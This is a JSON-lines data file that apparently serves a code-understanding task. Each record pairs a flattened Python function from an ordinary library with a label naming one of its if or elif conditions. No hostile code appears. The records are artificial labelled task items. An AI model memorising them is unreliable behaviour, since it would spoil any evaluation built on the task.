{"input": "def __init__(self, scale, factor, mode): self.index = 0 self.scale = scale if factor is None: self._log_factor = None else: if factor < 1.0: raise ValueError(\"'factor' must be >= 1.0\") self._log_factor = np.log(factor) if mode not in self.allowed_modes: raise ValueError( (\"'{0}' is not a recognized mode. \" \"Please select from: {1}\").format( mode, self.allowed_modes ) ) self.mode = mode", "label": "if factor < 1.0 :"}
{"input": "def get_grab_keys(self): keystr = None try: keys = self.display.get_grab_keys() for k in keys: if keystr is None: keystr = gtk.gdk.keyval_name(k) else: keystr = keystr + \"+\" + gtk.gdk.keyval_name(k) except: pass return keystr", "label": "if keystr is None :"}
{"input": "def _checkAllExamples(self, num_type): for region_code in phonenumberutil.SUPPORTED_REGIONS: numobj_py = phonenumberutil.example_number_for_type(region_code, num_type) if numobj_py is not None: numobj_pb = PyToPB(numobj_py) alt_py = PBToPy(numobj_pb) self.assertEqual(numobj_py, alt_py)", "label": "if numobj_py is not None :"}
{"input": "def _gaf10iterator(handle): for inline in handle: if inline[0] == \"!\": continue inrec = inline.rstrip(\"\\n\").split(\"\\t\") if len(inrec) == 1: continue inrec[3] = inrec[3].split(\"|\") # Qualifier inrec[5] = inrec[5].split(\"|\") # DB:reference(s) inrec[7] = inrec[7].split(\"|\") # With || From inrec[10] = inrec[10].split(\"|\") # Synonym inrec[12] = inrec[12].split(\"|\") # Taxon yield dict(zip(GAF10FIELDS, inrec))", "label": "if len ( inrec ) == 1 :"}
{"input": "def __xor__(self, other): inc, exc = _norm_args_notimplemented(other) if inc is NotImplemented: return NotImplemented if inc is NotImplemented: return NotImplemented if self._included is None: if exc is None: # - + return _ComplementSet(excluded=self._excluded - inc) else: # - - return _ComplementSet(included=self._excluded.symmetric_difference(exc)) else: if inc is None: # + - return _ComplementSet(excluded=exc - self._included) else: # + + return _ComplementSet(included=self._included.symmetric_difference(inc))", "label": "if exc is None :"}
{"input": "def connection(self, commit_on_success=False): with self._lock: if self._bulk_commit: if self._pending_connection is None: self._pending_connection = sqlite.connect(self.filename) con = self._pending_connection else: con = sqlite.connect(self.filename) try: if self.fast_save: con.execute(\"PRAGMA synchronous = 0;\") yield con if commit_on_success and self.can_commit: con.commit() finally: if not self._bulk_commit: con.close()", "label": "if not self . _bulk_commit :"}
{"input": "def renderable_events(self, date, hour): \"Returns the number of renderable events\" renderable_events = [] for event in self.events: if event.covers(date, hour): renderable_events.append(event) if hour: for current in renderable_events: for event in self.events: if event not in renderable_events: for hour in range(self.start_hour, self.end_hour): if current.covers(date, hour) and event.covers(date, hour): renderable_events.append(event) break return renderable_events", "label": "if event not in renderable_events :"}
{"input": "def _prepare_cooldowns(self, ctx): if self._buckets.valid: dt = ctx.message.edited_at or ctx.message.created_at current = dt.replace(tzinfo=datetime.timezone.utc).timestamp() bucket = self._buckets.get_bucket(ctx.message, current) retry_after = bucket.update_rate_limit(current) if retry_after: raise CommandOnCooldown(bucket, retry_after)", "label": "if retry_after :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_module(d.getPrefixedString()) continue if tt == 18: self.set_version(d.getPrefixedString()) continue if tt == 24: self.set_instances(d.getVarInt64()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 18 :"}
{"input": "def n_import_from(self, node): relative_path_index = 0 if self.version >= 2.5: if node[relative_path_index].pattr > 0: node[2].pattr = (\".\" * node[relative_path_index].pattr) + node[2].pattr if self.version > 2.7: if isinstance(node[1].pattr, tuple): imports = node[1].pattr for pattr in imports: node[1].pattr = pattr self.default(node) return pass self.default(node)", "label": "if self . version > 2.7 :"}
{"input": "def logic(): while 1: yield a var = 0 for i in downrange(len(a)): if a[i] == 1: var += 1 out.next = var", "label": "if a [ i ] == 1 :"}
{"input": "def _extract_networks(self, server_node): \"\"\"Marshal the networks attribute of a parsed request\"\"\" node = self.find_first_child_named(server_node, \"networks\") if node is not None: networks = [] for network_node in self.find_children_named(node, \"network\"): item = {} if network_node.hasAttribute(\"uuid\"): item[\"uuid\"] = network_node.getAttribute(\"uuid\") if network_node.hasAttribute(\"fixed_ip\"): item[\"fixed_ip\"] = network_node.getAttribute(\"fixed_ip\") networks.append(item) return networks else: return None", "label": "if network_node . hasAttribute ( \"uuid\" ) :"}
{"input": "def _model_shorthand(self, args): accum = [] for arg in args: if isinstance(arg, Node): accum.append(arg) elif isinstance(arg, Query): accum.append(arg) elif isinstance(arg, ModelAlias): accum.extend(arg.get_proxy_fields()) elif isclass(arg) and issubclass(arg, Model): accum.extend(arg._meta.declared_fields) return accum", "label": "elif isinstance ( arg , Query ) :"}
{"input": "def on_show_comment(self, widget, another): if widget.get_active(): if another.get_active(): self.treeview.update_items(all=True, comment=True) else: self.treeview.update_items(comment=True) else: if another.get_active(): self.treeview.update_items(all=True) else: self.treeview.update_items()", "label": "if another . get_active ( ) :"}
{"input": "def test_select_figure_formats_set(): ip = get_ipython() for fmts in [ {\"png\", \"svg\"}, [\"png\"], (\"jpeg\", \"pdf\", \"retina\"), {\"svg\"}, ]: active_mimes = {_fmt_mime_map[fmt] for fmt in fmts} pt.select_figure_formats(ip, fmts) for mime, f in ip.display_formatter.formatters.items(): if mime in active_mimes: nt.assert_in(Figure, f) else: nt.assert_not_in(Figure, f)", "label": "if mime in active_mimes :"}
{"input": "def update_from_data(self, data): super(HelpParameter, self).update_from_data(data) # original help.py value_sources are strings, update command strings to value-source dict if self.value_sources: self.value_sources = [ str_or_dict if isinstance(str_or_dict, dict) else {\"link\": {\"command\": str_or_dict}} for str_or_dict in self.value_sources ]", "label": "if isinstance ( str_or_dict , dict )"}
{"input": "def _reset_library_root_logger() -> None: global _default_handler with _lock: if not _default_handler: return library_root_logger = _get_library_root_logger() library_root_logger.removeHandler(_default_handler) library_root_logger.setLevel(logging.NOTSET) _default_handler = None", "label": "if not _default_handler :"}
{"input": "def extract_headers(headers): \"\"\"This function extracts valid headers from interactive input.\"\"\" sorted_headers = {} matches = re.findall(r\"(.*):\\s(.*)\", headers) for match in matches: header = match[0] value = match[1] try: if value[-1] == \",\": value = value[:-1] sorted_headers[header] = value except IndexError: pass return sorted_headers", "label": "if value [ - 1 ] == \",\" :"}
{"input": "def _call_user_data_handler(self, operation, src, dst): if hasattr(self, \"_user_data\"): for key, (data, handler) in self._user_data.items(): if handler is not None: handler.handle(operation, key, data, src, dst)", "label": "if handler is not None :"}
{"input": "def update(self, other=None, **kwargs): if other is not None: if hasattr(other, \"items\"): other = other.items() for key, value in other: if key in kwargs: raise TensorforceError.value( name=\"NestedDict.update\", argument=\"key\", value=key, condition=\"specified twice\", ) self[key] = value for key, value in kwargs.items(): self[key] = value", "label": "if hasattr ( other , \"items\" ) :"}
{"input": "def _restore_context(context): # Check for changes in contextvars, and set them to the current # context for downstream consumers for cvar in context: try: if cvar.get() != context.get(cvar): cvar.set(context.get(cvar)) except LookupError: cvar.set(context.get(cvar))", "label": "if cvar . get ( ) != context . get ( cvar ) :"}
{"input": "def __str__(self): s = \"{\" sep = \"\" for k, v in self.iteritems(): s += sep if type(k) == str: s += \"'%s'\" % k else: s += str(k) s += \": \" if type(v) == str: s += \"'%s'\" % v else: s += str(v) sep = \", \" s += \"}\" return s", "label": "if type ( k ) == str :"}
{"input": "def read_file_or_url(self, fname): # TODO: not working on localhost if isinstance(fname, file): result = open(fname, \"r\") else: match = self.urlre.match(fname) if match: result = urllib.urlopen(match.group(1)) else: fname = os.path.expanduser(fname) try: result = open(os.path.expanduser(fname), \"r\") except IOError: result = open( \"%s.%s\" % (os.path.expanduser(fname), self.defaultExtension), \"r\" ) return result", "label": "if match :"}
{"input": "def subclass_managers(self, recursive): for cls in self.class_.__subclasses__(): mgr = manager_of_class(cls) if mgr is not None and mgr is not self: yield mgr if recursive: for m in mgr.subclass_managers(True): yield m", "label": "if mgr is not None and mgr is not self :"}
{"input": "def star_path(path): \"\"\"Replace integers and integer-strings in a path with *\"\"\" path = list(path) for i, p in enumerate(path): if isinstance(p, int): path[i] = \"*\" else: if not isinstance(p, text_type): p = p.decode() if r_is_int.match(p): path[i] = \"*\" return join_path(path)", "label": "if r_is_int . match ( p ) :"}
{"input": "def cookie_decode(data, key): \"\"\"Verify and decode an encoded string. Return an object or None\"\"\" if isinstance(data, unicode): data = data.encode(\"ascii\") # 2to3 hack if cookie_is_encoded(data): sig, msg = data.split(u\"?\".encode(\"ascii\"), 1) # 2to3 hack if sig[1:] == base64.b64encode(hmac.new(key, msg).digest()): return pickle.loads(base64.b64decode(msg)) return None", "label": "if sig [ 1 : ] == base64 . b64encode ( hmac . new ( key , msg ) . digest ( ) ) :"}
{"input": "def parse_row(cls, doc_row): row = {} for field_name, field in FIELD_MAP.items(): if len(doc_row) > field[1]: field_value = doc_row[field[1]] else: field_value = \"\" if len(field) >= 3 and callable(field[2]): field_value = field[2](field_value) row[field_name] = field_value return row", "label": "if len ( field ) >= 3 and callable ( field [ 2 ] ) :"}
{"input": "def semantic_masks(self): for sid in self._seg_ids: sinfo = self._sinfo.get(sid) if sinfo is None or sinfo[\"isthing\"]: # Some pixels (e.g. id 0 in PanopticFPN) have no instance or semantic predictions. continue yield (self._seg == sid).numpy().astype(np.bool), sinfo", "label": "if sinfo is None or sinfo [ \"isthing\" ] :"}
{"input": "def top_level_subjects(self): if self.subjects.exists(): return optimize_subject_query(self.subjects.filter(parent__isnull=True)) else: # TODO: Delet this when all PreprintProviders have a mapping if len(self.subjects_acceptable) == 0: return optimize_subject_query( Subject.objects.filter(parent__isnull=True, provider___id=\"osf\") ) tops = set([sub[0][0] for sub in self.subjects_acceptable]) return [Subject.load(sub) for sub in tops]", "label": "if len ( self . subjects_acceptable ) == 0 :"}
{"input": "def resolve(obj): if isinstance(obj, list): for item in obj: resolve(item) return if isinstance(obj, dict): if \"$ref\" in obj: with resolver.resolving(obj[u\"$ref\"]) as resolved: resolve(resolved) obj.clear() obj.update(resolved) else: for value in obj.values(): resolve(value)", "label": "if \"$ref\" in obj :"}
{"input": "def read_ansible_config(project_path, variables_of_interest): fnames = [\"/etc/ansible/ansible.cfg\"] if project_path: fnames.append(os.path.join(project_path, \"ansible.cfg\")) values = {} try: parser = ConfigParser() parser.read(fnames) if \"defaults\" in parser: for var in variables_of_interest: if var in parser[\"defaults\"]: values[var] = parser[\"defaults\"][var] except Exception: logger.exception(\"Failed to read ansible configuration(s) {}\".format(fnames)) return values", "label": "if var in parser [ \"defaults\" ] :"}
{"input": "def test_globalphase(): rule_set = DecompositionRuleSet(modules=[globalphase, r2rzandph]) dummy = DummyEngine(save_commands=True) eng = MainEngine( dummy, [AutoReplacer(rule_set), InstructionFilter(low_level_gates_noglobalphase)], ) qubit = eng.allocate_qubit() R(1.2) | qubit rz_count = 0 for cmd in dummy.received_commands: assert not isinstance(cmd.gate, R) if isinstance(cmd.gate, Rz): rz_count += 1 assert cmd.gate == Rz(1.2) assert rz_count == 1", "label": "if isinstance ( cmd . gate , Rz ) :"}
{"input": "def _kill_current_player(self): if self._current_player: if self.voice_client.is_paused(): self.voice_client.resume() try: self.voice_client.stop() except OSError: pass self._current_player = None return True return False", "label": "if self . voice_client . is_paused ( ) :"}
{"input": "def hasAmbiguousLanguage(self, p): \"\"\"Return True if p.b contains different @language directives.\"\"\" # c = self languages, tag = set(), \"@language\" for s in g.splitLines(p.b): if g.match_word(s, 0, tag): i = g.skip_ws(s, len(tag)) j = g.skip_id(s, i) word = s[i:j] languages.add(word) return len(list(languages)) > 1", "label": "if g . match_word ( s , 0 , tag ) :"}
{"input": "def terminate(self): n_retries = 10 for i in range(n_retries): try: super(MemmappingPool, self).terminate() break except OSError as e: if isinstance(e, WindowsError): # Workaround occasional \"[Error 5] Access is denied\" issue # when trying to terminate a process under windows. sleep(0.1) if i + 1 == n_retries: warnings.warn( \"Failed to terminate worker processes in\" \" multiprocessing pool: %r\" % e ) self._temp_folder_manager._unlink_temporary_resources()", "label": "if i + 1 == n_retries :"}
{"input": "def test_downsampling(self, method, maybe_range, fraction, expected_n_reads): reader = sam.SamReader( test_utils.genomics_core_testdata(\"test.bam\"), downsample_fraction=fraction, random_seed=12345, ) with reader: if method == \"iterate\": reads_iter = reader.iterate() elif method == \"query\": reads_iter = reader.query(ranges.parse_literal(maybe_range)) else: self.fail(\"Unexpected method \" + str(method)) self.assertEqual(test_utils.iterable_len(reads_iter), expected_n_reads)", "label": "if method == \"iterate\" :"}
{"input": "def verify_acceptable(self): start = time.time() while True: if self.select_acceptable(): return elif (time.time() - start) > READ_TIMEOUT: raise Exception(\"Server socket did not accept in time\") time.sleep(0.1)", "label": "if self . select_acceptable ( ) :"}
{"input": "def replica_local_creator(next_creator, **kwargs) -> tf.Variable: \"\"\"Variable creator that by default creates replica local variables.\"\"\" if kwargs[\"synchronization\"] == tf.VariableSynchronization.AUTO: kwargs[\"synchronization\"] = tf.VariableSynchronization.ON_READ if kwargs[\"aggregation\"] == tf.VariableAggregation.NONE: kwargs[\"aggregation\"] = tf.VariableAggregation.ONLY_FIRST_REPLICA if kwargs[\"trainable\"] is None: kwargs[\"trainable\"] = True return next_creator(**kwargs)", "label": "if kwargs [ \"aggregation\" ] == tf . VariableAggregation . NONE :"}
{"input": "def get_optional_nargs(self, name): for n, kwargs in self.conf[\"optional_args\"]: if name == n: if \"action\" in kwargs: action = kwargs[\"action\"] if action in (\"store_true\", \"store_false\"): return 0 break return 1", "label": "if \"action\" in kwargs :"}
{"input": "def ageToDays(self, age_str): age = 0 age_str = age_str.replace(\"&nbsp;\", \" \") regex = \"(\\d*.?\\d+).(sec|hour|day|week|month|year)+\" matches = re.findall(regex, age_str) for match in matches: nr, size = match mult = 1 if size == \"week\": mult = 7 elif size == \"month\": mult = 30.5 elif size == \"year\": mult = 365 age += tryInt(nr) * mult return tryInt(age)", "label": "elif size == \"year\" :"}
{"input": "def put(self, userId, bucket, key, data): if not self.initialized: raise Exception(\"archive not initialized\") try: uri = self.uri_for(userId, bucket, key) if not self._save_content(uri, data): raise Exception(\"Failed writing file content to disk: {}\".format(uri)) else: return uri except Exception as err: logger.debug(\"cannot put data: exception - \" + str(err)) raise err", "label": "if not self . _save_content ( uri , data ) :"}
{"input": "def get_range(min, max): if max < min: min, max = max, min elif min == max: if min < 0: min, max = 2 * min, 0 elif min > 0: min, max = 0, 2 * min else: min, max = -1, 1 return min, max", "label": "elif min > 0 :"}
{"input": "def update_job_weights(): \"\"\"Update job weights.\"\"\" for job in data_types.Job.query(): multiplier = DEFAULT_MULTIPLIER if environment.is_engine_fuzzer_job(job.name): targets_count = ndb.Key(data_types.FuzzTargetsCount, job.name).get() # If the count is 0, it may be due to a bad build or some other issue. Use # the default weight in that case to allow for recovery. if targets_count and targets_count.count: multiplier = targets_count.count if multiplier > TARGET_COUNT_WEIGHT_CAP: multiplier = TARGET_COUNT_WEIGHT_CAP update_job_weight(job.name, multiplier)", "label": "if multiplier > TARGET_COUNT_WEIGHT_CAP :"}
{"input": "def _validate_required_settings( self, application_id, application_config, required_settings, should_throw=True ): \"\"\"All required keys must be present\"\"\" for setting_key in required_settings: if setting_key not in application_config.keys(): if should_throw: raise ImproperlyConfigured( MISSING_SETTING.format( application_id=application_id, setting=setting_key ) ) else: return False return True", "label": "if should_throw :"}
{"input": "def nested_update(org_dict, upd_dict): for key, value in upd_dict.items(): if isinstance(value, dict): if key in org_dict: if not isinstance(org_dict[key], dict): raise ValueError( \"Mismatch between org_dict and upd_dict at node {}\".format(key) ) nested_update(org_dict[key], value) else: org_dict[key] = value else: org_dict[key] = value", "label": "if key in org_dict :"}
{"input": "def eintr_retry_call(func, *args, **kwargs): while True: try: return func(*args, **kwargs) except EnvironmentError as e: if getattr(e, \"errno\", None) == errno.EINTR: continue raise", "label": "if getattr ( e , \"errno\" , None ) == errno . EINTR :"}
{"input": "def __init__(self, entity): self._entity = weakref.proxy(entity) self._observables = collections.OrderedDict() self._keys_helper = _ObservableKeys(self._entity, self._observables) # Ensure consistent ordering. for attr_name in sorted(dir(type(self))): type_attr = getattr(type(self), attr_name) if isinstance(type_attr, define.observable): self._observables[attr_name] = getattr(self, attr_name)", "label": "if isinstance ( type_attr , define . observable ) :"}
{"input": "def check_redundancy(self): # Ensure there are no adjacent blocks (they should have been merged) starts, sizes = self.allocator.get_allocated_regions() last = -1 for start, size in zip(starts, sizes): if start < last: raise Exception(\"Block at %d is out of order\" % start) if start == last: raise Exception(\"Block at %d is redundant\" % start) last = start + size", "label": "if start == last :"}
{"input": "def elfheader(): local_path = pwndbg.file.get_file(pwndbg.proc.exe) with open(local_path, \"rb\") as f: elffile = ELFFile(f) sections = [] for section in elffile.iter_sections(): start = section[\"sh_addr\"] # Don't print sections that aren't mapped into memory if start == 0: continue size = section[\"sh_size\"] sections.append((start, start + size, section.name)) sections.sort() for start, end, name in sections: print(\"%#x - %#x \" % (start, end), name)", "label": "if start == 0 :"}
{"input": "def orbit(): \"\"\"Define the internal thread for running the orbit.\"\"\" for point in points: self.set_position(point) self.set_focus(focus) self.set_viewup(viewup) self.renderer.ResetCameraClippingRange() self.render() time.sleep(step) if write_frames: self.write_frame()", "label": "if write_frames :"}
{"input": "def json_format(self): \"\"\"Returns the integer value formatted as a JSON literal\"\"\" fmt = self._jsonfmt if fmt == NUMBER_FORMAT_HEX: return format(self, \"#x\") elif fmt == NUMBER_FORMAT_OCTAL: return format(self, \"#o\") elif fmt == NUMBER_FORMAT_BINARY: return format(self, \"#b\") elif fmt == NUMBER_FORMAT_LEGACYOCTAL: if self == 0: return \"0\" # For some reason Python's int doesn't do '00' elif self < 0: return \"-0%o\" % (-self) else: return \"0%o\" % self else: return str(self)", "label": "elif self < 0 :"}
{"input": "def parseTime(timeStr): regex = re.compile(constants.PARSE_TIME_REGEX) parts = regex.match(timeStr) if not parts: return parts = parts.groupdict() time_params = {} for (name, param) in parts.items(): if param: if name == \"miliseconds\": time_params[\"microseconds\"] = int(param) * 1000 else: time_params[name] = int(param) return datetime.timedelta(**time_params).total_seconds()", "label": "if param :"}
{"input": "def build_extension(self, ext): ext._convert_pyx_sources_to_lang() _compiler = self.compiler try: if isinstance(ext, Library): self.compiler = self.shlib_compiler _build_ext.build_extension(self, ext) if ext._needs_stub: cmd = self.get_finalized_command(\"build_py\").build_lib self.write_stub(cmd, ext) finally: self.compiler = _compiler", "label": "if ext . _needs_stub :"}
{"input": "def __init__(self, type, data, name=None): Constant.__init__(self, type, data, name) self.tag.unique_value = None if isinstance(data, np.ndarray) and data.ndim > 0: flat_data = data.ravel() if flat_data.shape[0]: if (flat_data == flat_data[0]).all(): self.tag.unique_value = flat_data[0]", "label": "if flat_data . shape [ 0 ] :"}
{"input": "def _find_machine(deb_arch): for machine in _ARCH_TRANSLATIONS: if _ARCH_TRANSLATIONS[machine].get(\"deb\", \"\") == deb_arch: return machine elif _ARCH_TRANSLATIONS[machine].get(\"uts_machine\", \"\") == deb_arch: return machine raise errors.SnapcraftEnvironmentError( \"Cannot set machine from deb_arch {!r}\".format(deb_arch) )", "label": "elif _ARCH_TRANSLATIONS [ machine ] . get ( \"uts_machine\" , \"\" ) == deb_arch :"}
{"input": "def fields_for_form(form, only_fields, exclude_fields): fields = OrderedDict() for name, field in form.fields.items(): is_not_in_only = only_fields and name not in only_fields is_excluded = ( name in exclude_fields # or # name in already_created_fields ) if is_not_in_only or is_excluded: continue fields[name] = convert_form_field(field) return fields", "label": "if is_not_in_only or is_excluded :"}
{"input": "def wait_services_ready(selectors, min_counts, count_fun, timeout=None): readies = [0] * len(selectors) start_time = time.time() while True: all_satisfy = True for idx, selector in enumerate(selectors): if readies[idx] < min_counts[idx]: all_satisfy = False readies[idx] = count_fun(selector) break if all_satisfy: break if timeout and timeout + start_time < time.time(): raise TimeoutError(\"Wait cluster start timeout\") time.sleep(1)", "label": "if all_satisfy :"}
{"input": "def count_brokers(self): self.nb_brokers = 0 for broker in self.brokers: if not broker.spare: self.nb_brokers += 1 for realm in self.higher_realms: for broker in realm.brokers: if not broker.spare and broker.manage_sub_realms: self.nb_brokers += 1", "label": "if not broker . spare :"}
{"input": "def _adapt_polymorphic_element(self, element): if \"parententity\" in element._annotations: search = element._annotations[\"parententity\"] alias = self._polymorphic_adapters.get(search, None) if alias: return alias.adapt_clause(element) if isinstance(element, expression.FromClause): search = element elif hasattr(element, \"table\"): search = element.table else: return None alias = self._polymorphic_adapters.get(search, None) if alias: return alias.adapt_clause(element)", "label": "if alias :"}
{"input": "def get_all_methods(): estimators = all_estimators() for name, Estimator in estimators: if name.startswith(\"_\"): # skip private classes continue methods = [] for name in dir(Estimator): if name.startswith(\"_\"): continue method_obj = getattr(Estimator, name) if hasattr(method_obj, \"__call__\") or isinstance(method_obj, property): methods.append(name) methods.append(None) for method in sorted(methods, key=lambda x: str(x)): yield Estimator, method", "label": "if hasattr ( method_obj , \"__call__\" ) or isinstance ( method_obj , property ) :"}
{"input": "def __call__(self, es, params): ops = 0 indices = mandatory(params, \"indices\", self) only_if_exists = params.get(\"only-if-exists\", False) request_params = params.get(\"request-params\", {}) for index_name in indices: if not only_if_exists: es.indices.delete(index=index_name, params=request_params) ops += 1 elif only_if_exists and es.indices.exists(index=index_name): self.logger.info(\"Index [%s] already exists. Deleting it.\", index_name) es.indices.delete(index=index_name, params=request_params) ops += 1 return ops, \"ops\"", "label": "elif only_if_exists and es . indices . exists ( index = index_name ) :"}
{"input": "def get(): result = [] for b in self.key_bindings: if len(keys) < len(b.keys): match = True for i, j in zip(b.keys, keys): if i != j and i != Keys.Any: match = False break if match: result.append(b) return result", "label": "if len ( keys ) < len ( b . keys ) :"}
{"input": "def get_arg_list_scalar_arg_dtypes(arg_types): result = [] for arg_type in arg_types: if isinstance(arg_type, ScalarArg): result.append(arg_type.dtype) elif isinstance(arg_type, VectorArg): result.append(None) if arg_type.with_offset: result.append(np.int64) else: raise RuntimeError(\"arg type not understood: %s\" % type(arg_type)) return result", "label": "if isinstance ( arg_type , ScalarArg ) :"}
{"input": "def autocommitter(): while True: try: if not self._running: break if self._auto_commit_enable: self._auto_commit() self._cluster.handler.sleep(self._auto_commit_interval_ms / 1000) except ReferenceError: break except Exception: # surface all exceptions to the main thread self._worker_exception = sys.exc_info() break log.debug(\"Autocommitter thread exiting\")", "label": "if self . _auto_commit_enable :"}
{"input": "def on_conflict(self, *target_fields: Union[str, Term]) -> \"PostgreSQLQueryBuilder\": if not self._insert_table: raise QueryException(\"On conflict only applies to insert query\") self._on_conflict = True for target_field in target_fields: if isinstance(target_field, str): self._on_conflict_fields.append(self._conflict_field_str(target_field)) elif isinstance(target_field, Term): self._on_conflict_fields.append(target_field)", "label": "if isinstance ( target_field , str ) :"}
{"input": "def change_TV_DOWNLOAD_DIR(tv_download_dir): if tv_download_dir == \"\": sickbeard.TV_DOWNLOAD_DIR = \"\" return True if os.path.normpath(sickbeard.TV_DOWNLOAD_DIR) != os.path.normpath(tv_download_dir): if helpers.makeDir(tv_download_dir): sickbeard.TV_DOWNLOAD_DIR = os.path.normpath(tv_download_dir) logger.log(u\"Changed TV download folder to \" + tv_download_dir) else: return False return True", "label": "if helpers . makeDir ( tv_download_dir ) :"}
{"input": "def save_config(self, cmd=\"save config\", confirm=True, confirm_response=\"y\"): \"\"\"Saves Config.\"\"\" self.enable() if confirm: output = self.send_command_timing(command_string=cmd) if confirm_response: output += self.send_command_timing(confirm_response) else: # Send enter by default output += self.send_command_timing(self.RETURN) else: # Some devices are slow so match on trailing-prompt if you can output = self.send_command(command_string=cmd) return output", "label": "if confirm_response :"}
{"input": "def apply_gradient_for_batch(inputs, labels, weights, loss): with tf.GradientTape() as tape: outputs = self.model(inputs, training=True) if isinstance(outputs, tf.Tensor): outputs = [outputs] if self._loss_outputs is not None: outputs = [outputs[i] for i in self._loss_outputs] batch_loss = loss(outputs, labels, weights) if variables is None: vars = self.model.trainable_variables else: vars = variables grads = tape.gradient(batch_loss, vars) self._tf_optimizer.apply_gradients(zip(grads, vars)) self._global_step.assign_add(1) return batch_loss", "label": "if isinstance ( outputs , tf . Tensor ) :"}
{"input": "def sort(self, items): slow_sorts = [] switch_slow = False for sort in reversed(self.sorts): if switch_slow: slow_sorts.append(sort) elif sort.order_clause() is None: switch_slow = True slow_sorts.append(sort) else: pass for sort in slow_sorts: items = sort.sort(items) return items", "label": "if switch_slow :"}
{"input": "def getmod(self, nm): mod = None for thing in self.path: if isinstance(thing, basestring): owner = self.shadowpath.get(thing, -1) if owner == -1: owner = self.shadowpath[thing] = self.__makeOwner(thing) if owner: mod = owner.getmod(nm) else: mod = thing.getmod(nm) if mod: break return mod", "label": "if owner :"}
{"input": "def has(self, key): filename = self._get_filename(key) try: with open(filename, \"rb\") as f: pickle_time = pickle.load(f) if pickle_time == 0 or pickle_time >= time(): return True else: os.remove(filename) return False except (IOError, OSError, pickle.PickleError): return False", "label": "if pickle_time == 0 or pickle_time >= time ( ) :"}
{"input": "def forward(self, hs): h = self.c0(hs[-1]) for i in range(1, 8): h = F.concat([h, hs[-i - 1]]) if i < 7: h = self[\"c%d\" % i](h) else: h = self.c7(h) return h", "label": "if i < 7 :"}
{"input": "def get_custom_behaviour2(self): string = \"\" for arg in list(self.defaults.keys()) + self.var: if arg in self.__dict__: # Don't add redundant lines e.g. sus=sus; if str(arg) != str(self.__dict__[arg]): string += str(arg) + \"=\" + str(self.__dict__[arg]) + \";\\n\" return string", "label": "if arg in self . __dict__ :"}
{"input": "def _apply_operation(self, values): \"\"\"Method that defines the less-than-or-equal operation\"\"\" arg1 = next(values) for strict in self._strict: arg2 = next(values) if strict: if not (arg1 < arg2): return False else: if not (arg1 <= arg2): return False arg1 = arg2 return True", "label": "if not ( arg1 <= arg2 ) :"}
{"input": "def i_pshufb(self, op, off=0): dst = self.getOperValue(op, off) src = self.getOperValue(op, off) res = 0 if op.opers[0].tsize == 8: mask = 0x07 else: mask = 0x0F for i in range(op.opers[0].tsize): shfl = src & (1 << ((i * 8) + 7)) if shfl: s = 0 else: indx = (src >> (i * 8)) & mask s = (src >> (indx * 8)) & 0xFF res |= s << (i * 8) self.setOperValue(op, 0, res)", "label": "if shfl :"}
{"input": "def report_out_of_quota(self, appid): self.logger.warn(\"report_out_of_quota:%s\", appid) with self.lock: if appid not in self.out_of_quota_appids: self.out_of_quota_appids.append(appid) try: self.working_appid_list.remove(appid) except: pass", "label": "if appid not in self . out_of_quota_appids :"}
{"input": "def to_py(self, value: _StrUnset) -> _StrUnsetNone: self._basic_py_validation(value, str) if isinstance(value, usertypes.Unset): return value elif not value: return None value = os.path.expandvars(value) value = os.path.expanduser(value) try: if not os.path.isdir(value): raise configexc.ValidationError(value, \"must be a valid directory!\") if not os.path.isabs(value): raise configexc.ValidationError(value, \"must be an absolute path!\") except UnicodeEncodeError as e: raise configexc.ValidationError(value, e) return value", "label": "if not os . path . isdir ( value ) :"}
{"input": "def findinDoc(self, tagpath, pos, end): result = None if end == -1: end = self.docSize else: end = min(self.docSize, end) foundat = -1 for j in range(pos, end): item = self.docList[j] if item.find(b\"=\") >= 0: (name, argres) = item.split(b\"=\", 1) else: name = item argres = \"\" if isinstance(tagpath, str): tagpath = tagpath.encode(\"utf-8\") if name.endswith(tagpath): result = argres foundat = j break return foundat, result", "label": "if isinstance ( tagpath , str ) :"}
{"input": "def has_safe_repr(value): \"\"\"Does the node have a safe representation?\"\"\" if value is None or value is NotImplemented or value is Ellipsis: return True if isinstance(value, (bool, int, long, float, complex, basestring, xrange, Markup)): return True if isinstance(value, (tuple, list, set, frozenset)): for item in value: if not has_safe_repr(item): return False return True elif isinstance(value, dict): for key, value in value.iteritems(): if not has_safe_repr(key): return False if not has_safe_repr(value): return False return True return False", "label": "if not has_safe_repr ( value ) :"}
{"input": "def run(self): # Make some objects emit lights for obj in bpy.context.scene.objects: if \"modelId\" in obj: obj_id = obj[\"modelId\"] # In the case of the lamp if obj_id in self.lights: self._make_lamp_emissive(obj, self.lights[obj_id]) # Make the windows emit light if obj_id in self.windows: self._make_window_emissive(obj) # Also make ceilings slightly emit light if obj.name.startswith(\"Ceiling#\"): self._make_ceiling_emissive(obj)", "label": "if \"modelId\" in obj :"}
{"input": "def bitvector_case_fn( rng: Random, mode: RandomizationMode, size: int, invalid_making_pos: int = None ): bits = get_random_ssz_object( rng, Bitvector[size], max_bytes_length=(size + 7) // 8, max_list_length=size, mode=mode, chaos=False, ) if invalid_making_pos is not None and invalid_making_pos <= size: already_invalid = False for i in range(invalid_making_pos, size): if bits[i]: already_invalid = True if not already_invalid: bits[invalid_making_pos] = True return bits", "label": "if bits [ i ] :"}
{"input": "def get_transaction_execution_results(self, batch_signature): with self._condition: batch_status = self._batch_statuses.get(batch_signature) if batch_status is None: return None annotated_batch = self._batch_by_id.get(batch_signature) if annotated_batch is None: return None results = [] for txn in annotated_batch.batch.transactions: result = self._txn_results.get(txn.header_signature) if result is not None: results.append(result) return results", "label": "if result is not None :"}
{"input": "def one_xmm_reg_imm8(ii): # also allows SSE4 2-imm8 instr i, j, n = 0, 0, 0 for op in _gen_opnds(ii): if op_reg(op) and op_xmm(op): n += 1 elif op_imm8(op): i += 1 elif op_imm8_2(op): j += 1 else: return False return n == 1 and i == 1 and j <= 1", "label": "elif op_imm8_2 ( op ) :"}
{"input": "def whichmodule(obj, name): \"\"\"Find the module an object belong to.\"\"\" module_name = getattr(obj, \"__module__\", None) if module_name is not None: return module_name # Protect the iteration by using a list copy of sys.modules against dynamic # modules that trigger imports of other modules upon calls to getattr. for module_name, module in sys.modules.copy().items(): if module_name == \"__main__\" or module is None: continue try: if _getattribute(module, name)[0] is obj: return module_name except AttributeError: pass return \"__main__\"", "label": "if _getattribute ( module , name ) [ 0 ] is obj :"}
